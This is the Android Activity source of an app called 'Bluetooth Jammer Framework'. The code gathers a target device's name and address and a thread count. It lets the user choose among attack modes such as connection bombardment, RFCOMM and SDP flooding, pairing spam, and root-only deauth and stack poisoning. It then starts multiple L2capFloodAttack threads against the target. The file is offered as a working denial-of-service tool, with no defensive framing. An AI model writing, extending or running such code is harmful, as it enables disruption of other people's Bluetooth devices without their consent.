package com.eikarna.bluetoothjammer

import android.annotation.SuppressLint
import android.bluetooth.BluetoothAdapter
import android.graphics.text.LineBreaker
import android.os.Build
import android.os.Bundle
import android.util.Log
import android.widget.RadioGroup
import android.widget.ScrollView
import android.widget.Toast
import androidx.annotation.RequiresApi
import androidx.appcompat.app.AppCompatActivity
import androidx.core.text.isDigitsOnly
import androidx.core.widget.doAfterTextChanged
import api.AttackMode
import api.L2capFloodAttack
import com.google.android.material.button.MaterialButton
import com.google.android.material.materialswitch.MaterialSwitch
import com.google.android.material.radiobutton.MaterialRadioButton
import com.google.android.material.textview.MaterialTextView
import com.google.android.material.textfield.TextInputEditText
import java.util.Date
import util.Logger
import util.RootUtils
import kotlin.math.log

class AttackActivity : AppCompatActivity() {

    // Initialize UI elements
    private lateinit var viewDeviceName: MaterialTextView
    private lateinit var viewDeviceAddress: MaterialTextView
    private lateinit var viewThreads: TextInputEditText
    private lateinit var buttonStartStop: MaterialButton
    private lateinit var logAttack: MaterialTextView
    private lateinit var switchLog: MaterialSwitch
    private lateinit var radioGroupAttackMode: RadioGroup
    private lateinit var scrollViewLog: ScrollView

    // Initialize detail info
    private lateinit var deviceName: String
    private lateinit var address: String
    private var threads: Int = 8
    private var selectedAttackMode: AttackMode = AttackMode.MULTI_VECTOR

    companion object {
        @JvmStatic
        var isAttacking = false
        var FrameworkVersion = 2.0
        var loggingStatus = true
    }

    @RequiresApi(Build.VERSION_CODES.O)
    override fun onCreate(savedInstanceState: Bundle?) {
        Log.d("AttackActivity", "onCreate called")
        println("AttackActivity onCreate called")
        super.onCreate(savedInstanceState)
        setContentView(R.layout.attack_layout)

        // Get data from Intent
        deviceName = intent.getStringExtra("DEVICE_NAME") ?: "Unknown Device"
        address = intent.getStringExtra("ADDRESS") ?: "Unknown Address"
        threads = intent.getIntExtra("THREADS", 1)

        // Get Element ID
        viewDeviceName = findViewById(R.id.textViewDeviceName)
        viewDeviceAddress = findViewById(R.id.textViewAddress)
        viewThreads = findViewById(R.id.editTextThreads)
        buttonStartStop = findViewById(R.id.buttonStartStop)
        logAttack = findViewById(R.id.logTextView)
        switchLog = findViewById(R.id.switchLogView)
        radioGroupAttackMode = findViewById(R.id.radioGroupAttackMode)
        scrollViewLog = findViewById(R.id.scrollViewLog)

        // Set text views
        viewDeviceName.text = deviceName
        viewDeviceAddress.text = address
        viewThreads.setText("$threads")
        logAttack.justificationMode = LineBreaker.JUSTIFICATION_MODE_INTER_WORD
        
        // Enable auto-scroll for logs
        logAttack.addTextChangedListener(object : android.text.TextWatcher {
            override fun beforeTextChanged(s: CharSequence?, start: Int, count: Int, after: Int) {}
            override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {}
            override fun afterTextChanged(s: android.text.Editable?) {
                scrollViewLog.post { scrollViewLog.fullScroll(ScrollView.FOCUS_DOWN) }
            }
        })
        
        // Check root status and disable root modes if not rooted
        val isRooted = RootUtils.isRooted()
        val radioRootDeauth: MaterialRadioButton = findViewById(R.id.radioRootDeauth)
        val radioRootStackPoison: MaterialRadioButton = findViewById(R.id.radioRootStackPoison)
        
        if (!isRooted) {
            radioRootDeauth.isEnabled = false
            radioRootStackPoison.isEnabled = false
            radioRootDeauth.alpha = 0.5f
            radioRootStackPoison.alpha = 0.5f
        }
        
        Logger.appendLog(logAttack, "═══════════════════════════════════════")
        Logger.appendLog(logAttack, "Bluetooth Jammer Framework v$FrameworkVersion")
        Logger.appendLog(logAttack, "═══════════════════════════════════════")
        Logger.appendLog(logAttack, "Target: $deviceName")
        Logger.appendLog(logAttack, "Address: $address")
        Logger.appendLog(logAttack, "Root Status: ${if (isRooted) "✓ AVAILABLE" else "✗ NOT AVAILABLE"}")
        Logger.appendLog(logAttack, "═══════════════════════════════════════\n")

        // Attack Mode Selection Listener
        radioGroupAttackMode.setOnCheckedChangeListener { _, checkedId ->
            selectedAttackMode = when (checkedId) {
                R.id.radioMultiVector -> AttackMode.MULTI_VECTOR
                R.id.radioBombardment -> AttackMode.CONNECTION_BOMBARDMENT
                R.id.radioRfcommFlood -> AttackMode.RFCOMM_FLOOD
                R.id.radioL2cap -> AttackMode.L2CAP_ATTACK
                R.id.radioPairingSpam -> AttackMode.PAIRING_SPAM
                R.id.radioSdpFlood -> AttackMode.SDP_FLOODING
                R.id.radioRootDeauth -> AttackMode.ROOT_DEAUTH
                R.id.radioRootStackPoison -> AttackMode.ROOT_STACK_POISON
                else -> AttackMode.MULTI_VECTOR
            }
            Logger.appendLog(logAttack, "Mode selected: ${selectedAttackMode.displayName}")
            Logger.appendLog(logAttack, "Description: ${selectedAttackMode.description}")
            if (selectedAttackMode.requiresRoot && !isRooted) {
                Logger.appendLog(logAttack, "⚠️ WARNING: This mode requires root access!\n")
            } else {
                Logger.appendLog(logAttack, "")
            }
        }



        // Set button listener
        buttonStartStop.setOnClickListener {
            if (isAttacking) {
                stopAttack()
            } else {
                startAttack()
            }
        }

        // Threading Input listener
        viewThreads.doAfterTextChanged { str ->
            if (str != null) {
                if (str.toString() != "" && str.isDigitsOnly()) {
                    threads = str.toString().toInt()
                }
            }
        }

        // Logging Switch listener
        switchLog.setOnCheckedChangeListener { _, isChecked ->
            if (isChecked) {
                loggingStatus = true
                Toast.makeText(this@AttackActivity, "Logging Enabled! You may degrade performance issue.", Toast.LENGTH_LONG).show()
            } else {
                loggingStatus = false
                Toast.makeText(this@AttackActivity, "Logging Disabled!", Toast.LENGTH_LONG).show()
            }
        }
    }

    @RequiresApi(Build.VERSION_CODES.Q)
    @SuppressLint("MissingPermission")
    private fun startAttack() {
        isAttacking = true
        buttonStartStop.text = "STOP ATTACK"
        buttonStartStop.setIconResource(android.R.drawable.ic_media_pause)
        BluetoothAdapter.getDefaultAdapter().cancelDiscovery()
        
        Logger.appendLog(logAttack, "═══════════════════════════════════════")
        Logger.appendLog(logAttack, "⚡ ATTACK STARTED!")
        Logger.appendLog(logAttack, "═══════════════════════════════════════")
        Logger.appendLog(logAttack, "Mode: ${selectedAttackMode.displayName}")
        Logger.appendLog(logAttack, "Threads: $threads")
        Logger.appendLog(logAttack, "═══════════════════════════════════════\n")
        
        Toast.makeText(this@AttackActivity, "Attack started: ${selectedAttackMode.displayName}", Toast.LENGTH_SHORT).show()
        
        // Start threads rapidly
        for (i in 0 until threads) {
            val delayMs = i * 100L  // 0.1 seconds
            L2capFloodAttack(address, selectedAttackMode).startAttack(this, logAttack, threadId = i, delayMs = delayMs)
        }
    }

    @SuppressLint("MissingPermission")
    private fun stopAttack() {
        isAttacking = false
        buttonStartStop.text = "START ATTACK"
        buttonStartStop.setIconResource(android.R.drawable.ic_media_play)
        Logger.appendLog(logAttack, "\n═══════════════════════════════════════")
        Logger.appendLog(logAttack, "⏹ ATTACK STOPPED!")
        Logger.appendLog(logAttack, "═══════════════════════════════════════\n")
        BluetoothAdapter.getDefaultAdapter().startDiscovery()
        L2capFloodAttack(address, selectedAttackMode).stopAttack()
    }

    override fun onDestroy() {
        super.onDestroy()
        if (isAttacking) {
            stopAttack() // Ensure the attack stops if the activity is destroyed
        }
    }

    override fun onPause() {
        super.onPause()
        if (isAttacking) {
            stopAttack()
        }
    }
}
